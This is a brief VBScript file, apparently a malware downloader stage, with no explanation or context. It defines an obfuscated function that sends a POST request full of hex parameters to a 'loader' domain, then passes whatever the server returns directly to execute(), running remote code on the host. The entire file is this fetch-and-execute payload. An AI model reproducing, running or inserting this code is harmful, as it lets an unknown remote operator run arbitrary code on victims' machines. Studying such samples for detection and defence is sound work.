Function vab04c41b45927(sUrl, sRequest)
  set xa2ac4097 = CreateObject("Microsoft.XMLHTTP")
  xa2ac4097.open "POST", sUrl,false
  xa2ac4097.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
  xa2ac4097.setRequestHeader "Content-Length", Len(sRequest)
  xa2ac4097.send sRequest
  vab04c41b45927 = xa2ac4097.responseText
 End Function
aa8c055c0 = vab04c41b45927("http://loader.projecttopfullyellow2018.com/","313f422ac583444ba6045cd122653b0e=91e50fe1e39af2869d3336eaaeebdb43&70222949cc0db89ab32c9969754d4758=a9fb9e6ef40426e9add520623d521ab8&9ac403da7947a183884c18a67d3aa8de=7b1ce3d73b70f1a7246e7b76a35fb552&2fb544a21e8cb8768b80cc231ca2f691=7d62a275027741d98073d42b8f735c68&6ff05e7bfb82a4d50e29b052214a0c53=ef8446f35513a8d6aa2308357a268a7e&7ae26cbe9586dea7d1f0fa372aa86811=75877cb75154206c4e65e76b88a12712&d8d31bd778da8bdd536187c36e48892b=4a11654ad1e1e48352252859ff3032a0&1cb524b5a3f3f82be4a7d954063c07e2=1b9e43c170cd3fc59624a18663b8d4d2&58521e4e2bd3d4b988cbd17d7365df3c=6883966fd8f918a4aa29be29d2c386fb&b04c387c8384ca083a71b8da516f65f6=164bf317ea19ccfd9e97853edc2389f4&cff02a74da64d145a4aed3a577a106ab=35c5a2cb362c4d214156f930e7d13252")
execute(aa8c055c0)